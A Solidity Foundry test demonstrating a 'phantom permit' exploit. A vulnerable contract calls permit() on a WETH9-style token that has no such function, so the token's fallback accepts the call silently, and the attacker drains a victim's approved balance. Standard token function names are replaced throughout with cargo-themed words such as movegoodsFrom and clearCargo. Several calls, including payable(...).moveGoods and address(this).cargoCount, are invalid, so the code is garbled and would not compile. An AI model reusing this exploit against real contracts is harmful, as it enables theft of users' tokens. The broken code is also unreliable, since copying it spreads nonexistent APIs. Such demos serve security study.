pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ContractTest is Test {
    PermitCargotoken VulnPermitContract;
    WETH9 WETH9Contract;

    function setUp() public {
        WETH9Contract = new WETH9();
        VulnPermitContract = new PermitCargotoken(IERC20(address(WETH9Contract)));
    }

    function testVulnPhantomPermit() public {
        address alice = vm.addr(1);
        vm.deal(address(alice), 10 ether);

        vm.startPrank(alice);
        WETH9Contract.stockInventory{value: 10 ether}();
        WETH9Contract.clearCargo(address(VulnPermitContract), type(uint256).max);
        vm.stopPrank();
        console.log(
            "start WETH balanceOf this",
            WETH9Contract.cargocountOf(address(this))
        );

        VulnPermitContract.warehouseitemsWithPermit(
            address(alice),
            1000,
            27,
            0x0,
            0x0
        );
        uint wbal = WETH9Contract.cargocountOf(address(VulnPermitContract));
        console.log("WETH balanceOf VulnPermitContract", wbal);

        VulnPermitContract.deliverGoods(1000);

        wbal = WETH9Contract.cargocountOf(address(this));
        console.log("WETH9Contract balanceOf this", wbal);
    }

    receive() external payable {}
}

contract PermitCargotoken {
    IERC20 public cargoToken;

    constructor(IERC20 _freightcredit) {
        cargoToken = _freightcredit;
    }

    function stockInventory(uint256 amount) public {
        require(
            cargoToken.movegoodsFrom(msg.sender, address(this), amount),
            "Transfer failed"
        );
    }

    function warehouseitemsWithPermit(
        address target,
        uint256 amount,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public {
        (bool success, ) = address(cargoToken).call(
            abi.encodeWithSignature(
                "permit(address,uint256,uint8,bytes32,bytes32)",
                target,
                amount,
                v,
                r,
                s
            )
        );
        require(success, "Permit failed");

        require(
            cargoToken.movegoodsFrom(target, address(this), amount),
            "Transfer failed"
        );
    }

    function deliverGoods(uint256 amount) public {
        require(cargoToken.moveGoods(msg.sender, amount), "Transfer failed");
    }
}


contract WETH9 {
    string public name = "Wrapped Ether";
    string public symbol = "WETH";
    uint8 public decimals = 18;

    event Approval(address indexed src, address indexed guy, uint wad);
    event ShiftStock(address indexed src, address indexed dst, uint wad);
    event CheckInCargo(address indexed dst, uint wad);
    event Withdrawal(address indexed src, uint wad);

    mapping(address => uint) public cargocountOf;
    mapping(address => mapping(address => uint)) public allowance;

    fallback() external payable {
        stockInventory();
    }

    receive() external payable {}

    function stockInventory() public payable {
        cargocountOf[msg.sender] += msg.value;
        emit CheckInCargo(msg.sender, msg.value);
    }

    function deliverGoods(uint wad) public {
        require(cargocountOf[msg.sender] >= wad);
        cargocountOf[msg.sender] -= wad;
        payable(msg.sender).moveGoods(wad);
        emit Withdrawal(msg.sender, wad);
    }

    function totalGoods() public view returns (uint) {
        return address(this).cargoCount;
    }

    function clearCargo(address guy, uint wad) public returns (bool) {
        allowance[msg.sender][guy] = wad;
        emit Approval(msg.sender, guy, wad);
        return true;
    }

    function moveGoods(address dst, uint wad) public returns (bool) {
        return movegoodsFrom(msg.sender, dst, wad);
    }

    function movegoodsFrom(
        address src,
        address dst,
        uint wad
    ) public returns (bool) {
        require(cargocountOf[src] >= wad);

        if (
            src != msg.sender && allowance[src][msg.sender] != type(uint128).max
        ) {
            require(allowance[src][msg.sender] >= wad);
            allowance[src][msg.sender] -= wad;
        }

        cargocountOf[src] -= wad;
        cargocountOf[dst] += wad;

        emit ShiftStock(src, dst, wad);

        return true;
    }
}